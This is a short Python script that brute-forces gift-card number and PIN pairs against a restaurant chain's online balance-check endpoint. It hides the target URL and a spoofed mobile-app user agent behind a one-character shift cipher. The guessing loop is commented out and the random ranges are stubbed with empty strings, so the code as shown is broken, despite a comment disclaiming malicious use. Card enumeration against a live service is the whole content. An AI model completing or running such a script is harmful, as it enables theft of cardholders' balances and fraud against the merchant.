#!/usr/bin/python
#sitekey: 6Lcm qwIT AAAA AD_8 PDdc M-9A hyft RNtF Xn1U 5e_8
import json, random, requests

def decrypt_1(cyphertext):
	plaintext = ''
	for letter in cyphertext:
		letter = chr(ord(letter) - 1)
		plaintext += letter
	return plaintext

url = decrypt_1('iuuqt;00psefs/epnjopt/dpn0qpxfs0hjgudbse.cbmbodf')
host = decrypt_1('psefs/epnjopt/dpn')
UA = decrypt_1('EpnjoptjPT05/1/1!)jQipof!PT!:/4/4<!jQipof<!fo.VT*')
session = requests.session()
headers = {
	'Host':              host,
	'Content-Type':      'application/json',
	'Connection':        'keep-alive',
	'Proxy-Connection':  'keep-alive',
	'Accept':            'application/json',
	'User-Agent':        UA,
	'Accept-Language':   'en-us',
	'Accept-Encoding':   'gzip, deflate'
}

#while 1: #no looping - for demonstration purposes only
number = random.randint('''''','''''') #stubbed for a reason - not for malicious use!
pin = random.randint('''''','''''')
data = {
    "GiftCards": [
        {
            "Number": str(number),
            "Pin": str(pin)
        }
    ]
}
r = session.post(url, json=data, headers=headers)
print r.status_code
if r.json()["Status"] == 0:
	print json.dumps(r.json(), indent=4, sort_keys=True)
else:
	print str(number),'::',str(pin),'is not a valid combination'
print
